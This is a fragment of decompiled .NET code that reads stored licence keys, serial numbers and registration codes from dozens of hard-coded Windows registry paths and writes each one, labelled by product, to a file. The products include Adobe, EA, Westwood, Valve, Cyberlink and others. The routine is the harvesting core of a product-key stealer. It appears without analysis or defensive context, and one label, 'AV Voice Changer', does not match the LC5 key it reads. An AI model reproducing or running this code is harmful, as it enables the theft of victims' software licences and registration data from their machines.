					streamWriter.WriteLine("");
					goto IL_067a;
					IL_067a:
					num = 113;
					streamWriter.Flush();
					goto IL_0685;
					IL_0685:
					ProjectData.ClearProjectError();
					num3 = -18;
					goto IL_068e;
					IL_068e:
					num = 115;
					streamWriter.WriteLine("Adobe Photoshop 7");
					goto IL_069e;
					IL_069e:
					num = 116;
					value17 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Adobe\\Photoshop\\7.0\\Registration", "SERIAL", null));
					goto IL_06b9;
					IL_06b9:
					num = 117;
					streamWriter.WriteLine(value17);
					goto IL_06c6;
					IL_06c6:
					num = 118;
					streamWriter.Flush();
					goto IL_06d1;
					IL_06d1:
					num = 119;
					streamWriter.WriteLine("");
					goto IL_06e1;
					IL_06e1:
					num = 120;
					streamWriter.Flush();
					goto IL_06ec;
					IL_06ec:
					ProjectData.ClearProjectError();
					num3 = -19;
					goto IL_06f5;
					IL_06f5:
					num = 122;
					streamWriter.WriteLine("Advanced PDF Password Recovery");
					goto IL_0705;
					IL_0705:
					num = 123;
					value18 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Elcom\\Advanced PDF Password Recovery\\Registration", "Code", null));
					goto IL_0720;
					IL_0720:
					num = 124;
					streamWriter.WriteLine(value18);
					goto IL_072d;
					IL_072d:
					num = 125;
					streamWriter.Flush();
					goto IL_0738;
					IL_0738:
					num = 126;
					streamWriter.WriteLine("");
					goto IL_0748;
					IL_0748:
					num = 127;
					streamWriter.Flush();
					goto IL_0753;
					IL_0753:
					ProjectData.ClearProjectError();
					num3 = -20;
					goto IL_075c;
					IL_075c:
					num = 129;
					streamWriter.WriteLine("Advanced PDF Password Recovery Pro");
					goto IL_076f;
					IL_076f:
					num = 130;
					value19 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Elcom\\Advanced PDF Password Recovery Pro\\Registration", "Code", null));
					goto IL_078d;
					IL_078d:
					num = 131;
					streamWriter.WriteLine(value19);
					goto IL_079d;
					IL_079d:
					num = 132;
					streamWriter.Flush();
					goto IL_07ab;
					IL_07ab:
					num = 133;
					streamWriter.WriteLine("");
					goto IL_07be;
					IL_07be:
					num = 134;
					streamWriter.Flush();
					goto IL_07cc;
					IL_07cc:
					ProjectData.ClearProjectError();
					num3 = -21;
					goto IL_07d5;
					IL_07d5:
					num = 136;
					streamWriter.WriteLine("Advanced ZIP Password Recovery");
					goto IL_07e8;
					IL_07e8:
					num = 137;
					value20 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Elcom\\Advanced ZIP Password Recovery\\Registration", "Code", null));
					goto IL_0806;
					IL_0806:
					num = 138;
					streamWriter.WriteLine(value20);
					goto IL_0816;
					IL_0816:
					num = 139;
					streamWriter.Flush();
					goto IL_0824;
					IL_0824:
					num = 140;
					streamWriter.WriteLine("");
					goto IL_0837;
					IL_0837:
					num = 141;
					streamWriter.Flush();
					goto IL_0845;
					IL_0845:
					ProjectData.ClearProjectError();
					num3 = -22;
					goto IL_084e;
					IL_084e:
					num = 143;
					streamWriter.WriteLine("Anno 1701");
					goto IL_0861;
					IL_0861:
					num = 144;
					value21 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Sunflowers\\Anno 1701", "SerialNo", null));
					goto IL_087f;
					IL_087f:
					num = 145;
					streamWriter.WriteLine(value21);
					goto IL_088f;
					IL_088f:
					num = 146;
					streamWriter.Flush();
					goto IL_089d;
					IL_089d:
					num = 147;
					streamWriter.WriteLine("");
					goto IL_08b0;
					IL_08b0:
					num = 148;
					streamWriter.Flush();
					goto IL_08be;
					IL_08be:
					ProjectData.ClearProjectError();
					num3 = -23;
					goto IL_08c7;
					IL_08c7:
					num = 150;
					streamWriter.WriteLine("Ashamopp WinOptimizer Platinum");
					goto IL_08da;
					IL_08da:
					num = 151;
					value22 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ashampoo\\Ashampoo WinOptimizer Platinum 3", "Key", null));
					goto IL_08f8;
					IL_08f8:
					num = 152;
					streamWriter.WriteLine(value22);
					goto IL_0908;
					IL_0908:
					num = 153;
					streamWriter.Flush();
					goto IL_0916;
					IL_0916:
					num = 154;
					streamWriter.WriteLine("");
					goto IL_0929;
					IL_0929:
					num = 155;
					streamWriter.Flush();
					goto IL_0937;
					IL_0937:
					ProjectData.ClearProjectError();
					num3 = -24;
					goto IL_0940;
					IL_0940:
					num = 157;
					streamWriter.WriteLine("AV Voice Changer");
					goto IL_0953;
					IL_0953:
					num = 158;
					value23 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\@stake\\LC5\\Registration", "Unlock Code", null));
					goto IL_0971;
					IL_0971:
					num = 159;
					streamWriter.WriteLine(value23);
					goto IL_0981;
					IL_0981:
					num = 160;
					streamWriter.Flush();
					goto IL_098f;
					IL_098f:
					num = 161;
					streamWriter.WriteLine("");
					goto IL_09a2;
					IL_09a2:
					num = 162;
					streamWriter.Flush();
					goto IL_09b0;
					IL_09b0:
					ProjectData.ClearProjectError();
					num3 = -25;
					goto IL_09b9;
					IL_09b9:
					num = 164;
					streamWriter.WriteLine("Battlefield(1942)");
					goto IL_09cc;
					IL_09cc:
					num = 165;
					value24 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942", "ergc", null));
					goto IL_09ea;
					IL_09ea:
					num = 166;
					streamWriter.WriteLine(value24);
					goto IL_09fa;
					IL_09fa:
					num = 167;
					streamWriter.Flush();
					goto IL_0a08;
					IL_0a08:
					num = 168;
					streamWriter.WriteLine("");
					goto IL_0a1b;
					IL_0a1b:
					num = 169;
					streamWriter.Flush();
					goto IL_0a29;
					IL_0a29:
					ProjectData.ClearProjectError();
					num3 = -26;
					goto IL_0a32;
					IL_0a32:
					num = 171;
					streamWriter.WriteLine("Battlefield 1942 Secret Weapons of WWII");
					goto IL_0a45;
					IL_0a45:
					num = 172;
					value25 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 Secret Weapons of WWII", "ergc", null));
					goto IL_0a63;
					IL_0a63:
					num = 173;
					streamWriter.WriteLine(value25);
					goto IL_0a73;
					IL_0a73:
					num = 174;
					streamWriter.Flush();
					goto IL_0a81;
					IL_0a81:
					num = 175;
					streamWriter.WriteLine("");
					goto IL_0a94;
					IL_0a94:
					num = 176;
					streamWriter.Flush();
					goto IL_0aa2;
					IL_0aa2:
					ProjectData.ClearProjectError();
					num3 = -27;
					goto IL_0aab;
					IL_0aab:
					num = 178;
					streamWriter.WriteLine("Battlefield 1942 The Road to Rome");
					goto IL_0abe;
					IL_0abe:
					num = 179;
					value26 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome", "ergc", null));
					goto IL_0adc;
					IL_0adc:
					num = 180;
					streamWriter.WriteLine(value26);
					goto IL_0aec;
					IL_0aec:
					num = 181;
					streamWriter.Flush();
					goto IL_0afa;
					IL_0afa:
					num = 182;
					streamWriter.WriteLine("");
					goto IL_0b0d;
					IL_0b0d:
					num = 183;
					streamWriter.Flush();
					goto IL_0b1b;
					IL_0b1b:
					ProjectData.ClearProjectError();
					num3 = -28;
					goto IL_0b24;
					IL_0b24:
					num = 185;
					streamWriter.WriteLine("Battlefield 2");
					goto IL_0b37;
					IL_0b37:
					num = 186;
					value27 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Battlefield 2", "ergc", null));
					goto IL_0b55;
					IL_0b55:
					num = 187;
					streamWriter.WriteLine(value27);
					goto IL_0b65;
					IL_0b65:
					num = 188;
					streamWriter.Flush();
					goto IL_0b73;
					IL_0b73:
					num = 189;
					streamWriter.WriteLine("");
					goto IL_0b86;
					IL_0b86:
					num = 190;
					streamWriter.Flush();
					goto IL_0b94;
					IL_0b94:
					ProjectData.ClearProjectError();
					num3 = -29;
					goto IL_0b9d;
					IL_0b9d:
					num = 192;
					streamWriter.WriteLine("Battlefield(2142)");
					goto IL_0bb0;
					IL_0bb0:
					num = 193;
					value28 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 2142", "ergc", null));
					goto IL_0bce;
					IL_0bce:
					num = 194;
					streamWriter.WriteLine(value28);
					goto IL_0bde;
					IL_0bde:
					num = 195;
					streamWriter.Flush();
					goto IL_0bec;
					IL_0bec:
					num = 196;
					streamWriter.WriteLine("");
					goto IL_0bff;
					IL_0bff:
					num = 197;
					streamWriter.Flush();
					goto IL_0c0d;
					IL_0c0d:
					ProjectData.ClearProjectError();
					num3 = -30;
					goto IL_0c16;
					IL_0c16:
					num = 199;
					streamWriter.WriteLine("Battlefield Vietnam");
					goto IL_0c29;
					IL_0c29:
					num = 200;
					value29 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Battlefield Vietnam", "ergc", null));
					goto IL_0c47;
					IL_0c47:
					num = 201;
					streamWriter.WriteLine(value29);
					goto IL_0c57;
					IL_0c57:
					num = 202;
					streamWriter.Flush();
					goto IL_0c65;
					IL_0c65:
					num = 203;
					streamWriter.WriteLine("");
					goto IL_0c78;
					IL_0c78:
					num = 204;
					streamWriter.Flush();
					goto IL_0c86;
					IL_0c86:
					ProjectData.ClearProjectError();
					num3 = -31;
					goto IL_0c8f;
					IL_0c8f:
					num = 206;
					streamWriter.WriteLine("Black and White");
					goto IL_0ca2;
					IL_0ca2:
					num = 207;
					value30 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Black and White", "ergc", null));
					goto IL_0cc0;
					IL_0cc0:
					num = 208;
					streamWriter.WriteLine(value30);
					goto IL_0cd0;
					IL_0cd0:
					num = 209;
					streamWriter.Flush();
					goto IL_0cde;
					IL_0cde:
					num = 210;
					streamWriter.WriteLine("");
					goto IL_0cf1;
					IL_0cf1:
					num = 211;
					streamWriter.Flush();
					goto IL_0cff;
					IL_0cff:
					ProjectData.ClearProjectError();
					num3 = -32;
					goto IL_0d08;
					IL_0d08:
					num = 213;
					streamWriter.WriteLine("Black and White 2");
					goto IL_0d1b;
					IL_0d1b:
					num = 214;
					value31 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\Black and White 2", "ergc", null));
					goto IL_0d39;
					IL_0d39:
					num = 215;
					streamWriter.WriteLine(value31);
					goto IL_0d49;
					IL_0d49:
					num = 216;
					streamWriter.Flush();
					goto IL_0d57;
					IL_0d57:
					num = 217;
					streamWriter.WriteLine("");
					goto IL_0d6a;
					IL_0d6a:
					num = 218;
					streamWriter.Flush();
					goto IL_0d78;
					IL_0d78:
					ProjectData.ClearProjectError();
					num3 = -33;
					goto IL_0d81;
					IL_0d81:
					num = 220;
					streamWriter.WriteLine("Boulder Dash Rocks");
					goto IL_0d94;
					IL_0d94:
					num = 221;
					value32 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Boulder Dash Rocks", "ergc", null));
					goto IL_0db2;
					IL_0db2:
					num = 222;
					streamWriter.WriteLine(value32);
					goto IL_0dc2;
					IL_0dc2:
					num = 223;
					streamWriter.Flush();
					goto IL_0dd0;
					IL_0dd0:
					num = 224;
					streamWriter.WriteLine("");
					goto IL_0de3;
					IL_0de3:
					num = 225;
					streamWriter.Flush();
					goto IL_0df1;
					IL_0df1:
					ProjectData.ClearProjectError();
					num3 = -34;
					goto IL_0dfa;
					IL_0dfa:
					num = 227;
					streamWriter.WriteLine("Burnout Paradise");
					goto IL_0e0d;
					IL_0e0d:
					num = 228;
					value33 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Burnout Paradise", "ergc", null));
					goto IL_0e2b;
					IL_0e2b:
					num = 229;
					streamWriter.WriteLine(value33);
					goto IL_0e3b;
					IL_0e3b:
					num = 230;
					streamWriter.Flush();
					goto IL_0e49;
					IL_0e49:
					num = 231;
					streamWriter.WriteLine("");
					goto IL_0e5c;
					IL_0e5c:
					num = 232;
					streamWriter.Flush();
					goto IL_0e6a;
					IL_0e6a:
					ProjectData.ClearProjectError();
					num3 = -35;
					goto IL_0e73;
					IL_0e73:
					num = 234;
					streamWriter.WriteLine("Camtasia Studio 4(Name)");
					goto IL_0e86;
					IL_0e86:
					num = 235;
					value34 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\4.0", "RegisteredTo", null));
					goto IL_0ea4;
					IL_0ea4:
					num = 236;
					streamWriter.WriteLine(value34);
					goto IL_0eb4;
					IL_0eb4:
					num = 237;
					streamWriter.Flush();
					goto IL_0ec2;
					IL_0ec2:
					num = 238;
					streamWriter.WriteLine("");
					goto IL_0ed5;
					IL_0ed5:
					num = 239;
					streamWriter.Flush();
					goto IL_0ee3;
					IL_0ee3:
					ProjectData.ClearProjectError();
					num3 = -36;
					goto IL_0eec;
					IL_0eec:
					num = 241;
					streamWriter.WriteLine("Camtasia Studio 4(Key)");
					goto IL_0eff;
					IL_0eff:
					num = 242;
					value35 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\4.0", "RegistrationKey", null));
					goto IL_0f1d;
					IL_0f1d:
					num = 243;
					streamWriter.WriteLine(value35);
					goto IL_0f2d;
					IL_0f2d:
					num = 244;
					streamWriter.Flush();
					goto IL_0f3b;
					IL_0f3b:
					num = 245;
					streamWriter.WriteLine("");
					goto IL_0f4e;
					IL_0f4e:
					num = 246;
					streamWriter.Flush();
					goto IL_0f5c;
					IL_0f5c:
					ProjectData.ClearProjectError();
					num3 = -37;
					goto IL_0f65;
					IL_0f65:
					num = 248;
					streamWriter.WriteLine("Chrome");
					goto IL_0f78;
					IL_0f78:
					num = 249;
					value36 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Techland\\Chrome", "SerialNumber", null));
					goto IL_0f96;
					IL_0f96:
					num = 250;
					streamWriter.WriteLine(value36);
					goto IL_0fa6;
					IL_0fa6:
					num = 251;
					streamWriter.Flush();
					goto IL_0fb4;
					IL_0fb4:
					num = 252;
					streamWriter.WriteLine("");
					goto IL_0fc7;
					IL_0fc7:
					num = 253;
					streamWriter.Flush();
					goto IL_0fd5;
					IL_0fd5:
					ProjectData.ClearProjectError();
					num3 = -38;
					goto IL_0fde;
					IL_0fde:
					num = 255;
					streamWriter.WriteLine("Codec Tweak Tool");
					goto IL_0ff1;
					IL_0ff1:
					num = 256;
					value37 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Codec Tweak Tool", "serial", null));
					goto IL_100f;
					IL_100f:
					num = 257;
					streamWriter.WriteLine(value37);
					goto IL_101f;
					IL_101f:
					num = 258;
					streamWriter.Flush();
					goto IL_102d;
					IL_102d:
					num = 259;
					streamWriter.WriteLine("");
					goto IL_1040;
					IL_1040:
					num = 260;
					streamWriter.Flush();
					goto IL_104e;
					IL_104e:
					ProjectData.ClearProjectError();
					num3 = -39;
					goto IL_1057;
					IL_1057:
					num = 262;
					streamWriter.WriteLine("Command and Conquer Generals");
					goto IL_106a;
					IL_106a:
					num = 263;
					value38 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Generals", "ergc", null));
					goto IL_1088;
					IL_1088:
					num = 264;
					streamWriter.WriteLine(value38);
					goto IL_1098;
					IL_1098:
					num = 265;
					streamWriter.Flush();
					goto IL_10a6;
					IL_10a6:
					num = 266;
					streamWriter.WriteLine("");
					goto IL_10b9;
					IL_10b9:
					num = 267;
					streamWriter.Flush();
					goto IL_10c7;
					IL_10c7:
					ProjectData.ClearProjectError();
					num3 = -40;
					goto IL_10d0;
					IL_10d0:
					num = 269;
					streamWriter.WriteLine("Command and Conquer Generals Zero Hour");
					goto IL_10e3;
					IL_10e3:
					num = 270;
					value39 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Command and Conquer Generals Zero Hour", "ergc", null));
					goto IL_1101;
					IL_1101:
					num = 271;
					streamWriter.WriteLine(value39);
					goto IL_1111;
					IL_1111:
					num = 272;
					streamWriter.Flush();
					goto IL_111f;
					IL_111f:
					num = 273;
					streamWriter.WriteLine("");
					goto IL_1132;
					IL_1132:
					num = 274;
					streamWriter.Flush();
					goto IL_1140;
					IL_1140:
					ProjectData.ClearProjectError();
					num3 = -41;
					goto IL_1149;
					IL_1149:
					num = 276;
					streamWriter.WriteLine("Red Alert 2");
					goto IL_115c;
					IL_115c:
					num = 277;
					value40 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Red Alert 2", "Serial", null));
					goto IL_117a;
					IL_117a:
					num = 278;
					streamWriter.WriteLine(value40);
					goto IL_118a;
					IL_118a:
					num = 279;
					streamWriter.Flush();
					goto IL_1198;
					IL_1198:
					num = 280;
					streamWriter.WriteLine("");
					goto IL_11ab;
					IL_11ab:
					num = 281;
					streamWriter.Flush();
					goto IL_11b9;
					IL_11b9:
					ProjectData.ClearProjectError();
					num3 = -42;
					goto IL_11c2;
					IL_11c2:
					num = 283;
					streamWriter.WriteLine("Red Alert");
					goto IL_11d5;
					IL_11d5:
					num = 284;
					value41 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Red Alert", "Serial", null));
					goto IL_11f3;
					IL_11f3:
					num = 285;
					streamWriter.WriteLine(value41);
					goto IL_1203;
					IL_1203:
					num = 286;
					streamWriter.Flush();
					goto IL_1211;
					IL_1211:
					num = 287;
					streamWriter.WriteLine("");
					goto IL_1224;
					IL_1224:
					num = 288;
					streamWriter.Flush();
					goto IL_1232;
					IL_1232:
					ProjectData.ClearProjectError();
					num3 = -43;
					goto IL_123b;
					IL_123b:
					num = 290;
					streamWriter.WriteLine("Command and Conquer Tiberian Sun");
					goto IL_124e;
					IL_124e:
					num = 291;
					value42 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Tiberian Sun", "Serial", null));
					goto IL_126c;
					IL_126c:
					num = 292;
					streamWriter.WriteLine(value42);
					goto IL_127c;
					IL_127c:
					num = 293;
					streamWriter.Flush();
					goto IL_128a;
					IL_128a:
					num = 294;
					streamWriter.WriteLine("");
					goto IL_129d;
					IL_129d:
					num = 295;
					streamWriter.Flush();
					goto IL_12ab;
					IL_12ab:
					ProjectData.ClearProjectError();
					num3 = -44;
					goto IL_12b4;
					IL_12b4:
					num = 297;
					streamWriter.WriteLine("Command and Conquer 3");
					goto IL_12c7;
					IL_12c7:
					num = 298;
					value43 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Command and Conquer 3", "ergc", null));
					goto IL_12e5;
					IL_12e5:
					num = 299;
					streamWriter.WriteLine(value43);
					goto IL_12f5;
					IL_12f5:
					num = 300;
					streamWriter.Flush();
					goto IL_1303;
					IL_1303:
					num = 301;
					streamWriter.WriteLine("");
					goto IL_1316;
					IL_1316:
					num = 302;
					streamWriter.Flush();
					goto IL_1324;
					IL_1324:
					ProjectData.ClearProjectError();
					num3 = -45;
					goto IL_132d;
					IL_132d:
					num = 304;
					streamWriter.WriteLine("Command and Conquer 3");
					goto IL_1340;
					IL_1340:
					num = 305;
					value44 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Command and Conquer 3", "ergc", null));
					goto IL_135e;
					IL_135e:
					num = 306;
					streamWriter.WriteLine(value44);
					goto IL_136e;
					IL_136e:
					num = 307;
					streamWriter.Flush();
					goto IL_137c;
					IL_137c:
					num = 308;
					streamWriter.WriteLine("");
					goto IL_138f;
					IL_138f:
					num = 309;
					streamWriter.Flush();
					goto IL_139d;
					IL_139d:
					ProjectData.ClearProjectError();
					num3 = -46;
					goto IL_13a6;
					IL_13a6:
					num = 311;
					streamWriter.WriteLine("Company of Heroes");
					goto IL_13b9;
					IL_13b9:
					num = 312;
					value45 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Company of Heroes", "CoHProductKey", null));
					goto IL_13d7;
					IL_13d7:
					num = 313;
					streamWriter.WriteLine(value45);
					goto IL_13e7;
					IL_13e7:
					num = 314;
					streamWriter.Flush();
					goto IL_13f5;
					IL_13f5:
					num = 315;
					streamWriter.WriteLine("");
					goto IL_1408;
					IL_1408:
					num = 316;
					streamWriter.Flush();
					goto IL_1416;
					IL_1416:
					ProjectData.ClearProjectError();
					num3 = -47;
					goto IL_141f;
					IL_141f:
					num = 318;
					streamWriter.WriteLine("Company of Heroes");
					goto IL_1432;
					IL_1432:
					num = 319;
					value46 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Company of Heroes", "CoHOFProductKey", null));
					goto IL_1450;
					IL_1450:
					num = 320;
					streamWriter.WriteLine(value46);
					goto IL_1460;
					IL_1460:
					num = 321;
					streamWriter.Flush();
					goto IL_146e;
					IL_146e:
					num = 322;
					streamWriter.WriteLine("");
					goto IL_1481;
					IL_1481:
					num = 323;
					streamWriter.Flush();
					goto IL_148f;
					IL_148f:
					ProjectData.ClearProjectError();
					num3 = -48;
					goto IL_1498;
					IL_1498:
					num = 325;
					streamWriter.WriteLine("Counter-Strike");
					goto IL_14ab;
					IL_14ab:
					num = 326;
					value47 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Counter-Strike\\Settings", "Key", null));
					goto IL_14c9;
					IL_14c9:
					num = 327;
					streamWriter.WriteLine(value47);
					goto IL_14d9;
					IL_14d9:
					num = 328;
					streamWriter.Flush();
					goto IL_14e7;
					IL_14e7:
					num = 329;
					streamWriter.WriteLine("");
					goto IL_14fa;
					IL_14fa:
					num = 330;
					streamWriter.Flush();
					goto IL_1508;
					IL_1508:
					ProjectData.ClearProjectError();
					num3 = -49;
					goto IL_1511;
					IL_1511:
					num = 332;
					streamWriter.WriteLine("Crysis");
					goto IL_1524;
					IL_1524:
					num = 333;
					value48 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Crysis", "ergc", null));
					goto IL_1542;
					IL_1542:
					num = 334;
					streamWriter.WriteLine(value48);
					goto IL_1552;
					IL_1552:
					num = 335;
					streamWriter.Flush();
					goto IL_1560;
					IL_1560:
					num = 336;
					streamWriter.WriteLine("");
					goto IL_1573;
					IL_1573:
					num = 337;
					streamWriter.Flush();
					goto IL_1581;
					IL_1581:
					ProjectData.ClearProjectError();
					num3 = -50;
					goto IL_158a;
					IL_158a:
					num = 339;
					streamWriter.WriteLine("PowerDVD");
					goto IL_159d;
					IL_159d:
					num = 340;
					value49 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Cyberlink\\PowerDVD", "CDKey", null));
					goto IL_15bb;
					IL_15bb:
					num = 341;
					streamWriter.WriteLine(value49);
					goto IL_15cb;
					IL_15cb:
					num = 342;
					streamWriter.Flush();
					goto IL_15d9;
					IL_15d9:
					num = 343;
					streamWriter.WriteLine("");
					goto IL_15ec;
					IL_15ec:
					num = 344;
					streamWriter.Flush();
					goto IL_15fa;
					IL_15fa:
					ProjectData.ClearProjectError();
					num3 = -51;
					goto IL_1603;
					IL_1603:
					num = 346;
					streamWriter.WriteLine("PowerBar");
					goto IL_1616;
					IL_1616:
					num = 347;
					value50 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Cyberlink\\PowerBar", "CDKey", null));
					goto IL_1634;
					IL_1634:
					num = 348;
					streamWriter.WriteLine(value50);
					goto IL_1644;
					IL_1644:
					num = 349;
					streamWriter.Flush();
					goto IL_1652;
					IL_1652:
					num = 350;
					streamWriter.WriteLine("");
					goto IL_1665;
					IL_1665:
					num = 351;
					streamWriter.Flush();
					goto IL_1673;
					IL_1673:
					ProjectData.ClearProjectError();
					num3 = -52;
					goto IL_167c;
					IL_167c:
					num = 353;
					streamWriter.WriteLine("CyberLink PowerProducer");
					goto IL_168f;
					IL_168f:
					num = 354;
					value51 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\CyberLink\\PowerProducer\\3.0\\UserReg", "SR_No", null));
					goto IL_16ad;
					IL_16ad:
					num = 355;
					streamWriter.WriteLine(value51);
					goto IL_16bd;
					IL_16bd:
					num = 356;
					streamWriter.Flush();
					goto IL_16cb;
					IL_16cb:
					num = 357;
					streamWriter.WriteLine("");
					goto IL_16de;
					IL_16de:
					num = 358;
					streamWriter.Flush();
					goto IL_16ec;
					IL_16ec:
					ProjectData.ClearProjectError();
					num3 = -53;
					goto IL_16f5;
					IL_16f5:
					num = 360;
					streamWriter.WriteLine("Day of Defeat");
					goto IL_1708;
					IL_1708:
					num = 361;
					value52 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Day of Defeat\\Settings", "Key", null));
					goto IL_1726;
					IL_1726:
					num = 362;
					streamWriter.WriteLine(value52);
					goto IL_1736;
					IL_1736:
					num = 363;
					streamWriter.Flush();
					goto IL_1744;
					IL_1744:
					num = 364;
					streamWriter.WriteLine("");
					goto IL_1757;
					IL_1757:
					num = 365;
					streamWriter.Flush();
					goto IL_1765;
					IL_1765:
					ProjectData.ClearProjectError();
					num3 = -54;
					goto IL_176e;
					IL_176e:
					num = 367;
					streamWriter.WriteLine("The Battle for Middle-earth II");
					goto IL_1781;
					IL_1781:
					num = 368;
					value53 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\The Battle for Middle-earth II", "ergc", null));
					goto IL_179f;
					IL_179f:
					num = 369;
					streamWriter.WriteLine(value53);
					goto IL_17af;
					IL_17af:
					num = 370;
					streamWriter.Flush();
					goto IL_17bd;
					IL_17bd:
					num = 371;
					streamWriter.WriteLine("");
					goto IL_17d0;
					IL_17d0:
					num = 372;
					streamWriter.Flush();
					goto IL_17de;
					IL_17de:
					ProjectData.ClearProjectError();
					num3 = -55;
					goto IL_17e7;
					IL_17e7:
					num = 374;
					streamWriter.WriteLine("The Sims 2");
					goto IL_17fa;
					IL_17fa:
					num = 375;
					value54 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2", "ergc", null));
					goto IL_1818;
					IL_1818:
					num = 376;
					streamWriter.WriteLine(value54);
					goto IL_1828;
					IL_1828:
					num = 377;
					streamWriter.Flush();
					goto IL_1836;
					IL_1836:
					num = 378;
					streamWriter.WriteLine("");
					goto IL_1849;
					IL_1849:
					num = 379;
					streamWriter.Flush();
					goto IL_1857;
					IL_1857:
					ProjectData.ClearProjectError();
					num3 = -56;
					goto IL_1860;
					IL_1860:
					num = 381;
					streamWriter.WriteLine("The Sims 2 University");
					goto IL_1873;
					IL_1873:
					num = 382;
					value55 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 University", "ergc", null));
					goto IL_1891;
					IL_1891:
					num = 383;
					streamWriter.WriteLine(value55);
					goto IL_18a1;
					IL_18a1:
					num = 384;
					streamWriter.Flush();
					goto IL_18af;
					IL_18af:
					num = 385;
					streamWriter.WriteLine("");
					goto IL_18c2;
					IL_18c2:
					num = 386;
					streamWriter.Flush();
					goto IL_18d0;
					IL_18d0:
					ProjectData.ClearProjectError();
					num3 = -57;
					goto IL_18d9;
					IL_18d9:
					num = 388;
					streamWriter.WriteLine("The Sims 2 Nightlife");
					goto IL_18ec;
					IL_18ec:
					num = 389;
					value56 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Nightlife", "ergc", null));
					goto IL_190a;
					IL_190a:
					num = 390;
					streamWriter.WriteLine(value56);
					goto IL_191a;
					IL_191a:
					num = 391;
					streamWriter.Flush();
					goto IL_1928;
					IL_1928:
					num = 392;
					streamWriter.WriteLine("");
					goto IL_193b;
					IL_193b:
					num = 393;
					streamWriter.Flush();
					goto IL_1949;
					IL_1949:
					ProjectData.ClearProjectError();
					num3 = -58;
					goto IL_1952;
					IL_1952:
					num = 395;
					streamWriter.WriteLine("The Sims 2 Open For Business");
					goto IL_1965;
					IL_1965:
					num = 396;
					value57 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Open For Business", "ergc", null));
					goto IL_1983;
					IL_1983:
					num = 397;
					streamWriter.WriteLine(value57);
					goto IL_1993;
					IL_1993:
					num = 398;
					streamWriter.Flush();
					goto IL_19a1;
					IL_19a1:
					num = 399;
					streamWriter.WriteLine("");
					goto IL_19b4;
					IL_19b4:
					num = 400;
					streamWriter.Flush();
					goto IL_19c2;
					IL_19c2:
					ProjectData.ClearProjectError();
					num3 = -59;
